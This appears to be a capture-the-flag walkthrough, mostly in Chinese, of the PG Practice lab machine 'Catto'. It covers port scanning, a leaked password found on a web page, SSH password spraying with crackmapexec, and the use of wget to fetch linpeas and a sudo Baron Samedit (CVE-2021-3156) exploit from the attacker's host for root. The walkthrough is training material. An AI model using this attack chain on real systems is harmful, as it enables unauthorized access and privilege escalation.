###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Catto
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.233.139 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.233.139:8080
Open 192.168.233.139:18080
Open 192.168.233.139:30330
Open 192.168.233.139:41651
Open 192.168.233.139:50400
Open 192.168.233.139:42247
Open 192.168.233.139:42022

PORT      STATE SERVICE REASON  VERSION
8080/tcp  open  http    syn-ack nginx 1.14.1
|_http-open-proxy: Proxy might be redirecting requests
30330/tcp open  http    syn-ack Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-favicon: Unknown favicon MD5: BC550ED3CF565EB8D826B8A5840A6527
41651/tcp open  unknown syn-ack
42022/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
42247/tcp open  http    syn-ack Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-cors: HEAD GET POST PUT DELETE PATCH
50400/tcp open  http    syn-ack Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Error
```

`dirsearch`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ dirsearch -u http://192.168.233.139:30330

[02:36:35] Starting:                                                                                                              
[02:37:16] 301 -  177B  - /icons  ->  /icons/                               
[02:37:39] 301 -  179B  - /static  ->  /static/
```

查看`http://192.168.233.139:30330/static/`，可以看到`http://192.168.233.139:30330/new-server-config-mc`，有一個密碼`WallAskCharacter305`
```
Private Server Config
November, 10, 2020

The new password for the MC server is: WallAskCharacter305

Remember to contact me add you in the allowed list of the server.
```

點到`http://192.168.233.139:30330/minecraft`，他說裡面有`sabel`、`yvette`、`zahara`、`sybilla`、`marcus`、`tabbatha`、`tabby`上線
```
Minecraft - The Island
November, 05, 2020

Minecraft: The Island by Max Brooks, #1 New York Times bestselling author of World War Z, is the first official Minecraft novel. In the tradition of iconic stories like Robinson Crusoe and Treasure Island, Minecraft: The Island will tell the story of a new hero stranded in the world of Minecraft, who must survive the harsh, unfamiliar environment and unravel the secrets of the island.

We loved this book so much that created a server. Already invited and added keralis, xisuma, zombiecleo, mumbojumbo, and waiting for a reply on the entire hermicraft clan. There is a limit on the server, but at least sabel, yvette, zahara, sybilla, marcus, tabbatha and tabby are already online and building.

Good luck everybody!
```

做一個`users.txt`，CME
```
┌──(kali㉿kali)-[~/pgplay]
└─$ cat users.txt                                                       
 sabel
 yvette
 zahara
 sybilla
 marcus
 tabbatha
 tabby

┌──(kali㉿kali)-[~/pgplay]
└─$ crackmapexec ssh -u users.txt -p WallAskCharacter305 --port 42022 192.168.233.139

SSH         192.168.233.139 42022  192.168.233.139  [*] SSH-2.0-OpenSSH_8.0
SSH         192.168.233.139 42022  192.168.233.139  [-] sabel:WallAskCharacter305 Authentication failed.
SSH         192.168.233.139 42022  192.168.233.139  [-] yvette:WallAskCharacter305 Authentication failed.
SSH         192.168.233.139 42022  192.168.233.139  [-] zahara:WallAskCharacter305 Authentication failed.
SSH         192.168.233.139 42022  192.168.233.139  [-] sybilla:WallAskCharacter305 Authentication failed.
SSH         192.168.233.139 42022  192.168.233.139  [+] marcus:WallAskCharacter305
```

用`marcus/WallAskCharacter305`ssh登入，在`/home/marcus`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh -p 42022 marcus@192.168.233.139

[marcus@catto ~]$ cat local.txt
25138965fdf714c69f90d1ea52e5203b
```

`linpeas.sh`
```
[marcus@catto tmp]$ wget 192.168.45.179:8080/linpeas.sh
[marcus@catto tmp]$ chmod +x linpeas.sh
[marcus@catto tmp]$ ./linpeas.sh

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

用[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)得root，在/root得proof.txt
```
[marcus@catto tmp]$ wget 192.168.45.179:8080/exploit_nss.py
[marcus@catto tmp]$ python3 exploit_nss.py
[root@catto root]# cat proof.txt
0c1d76f0a988502d34704ddd0038d39f
```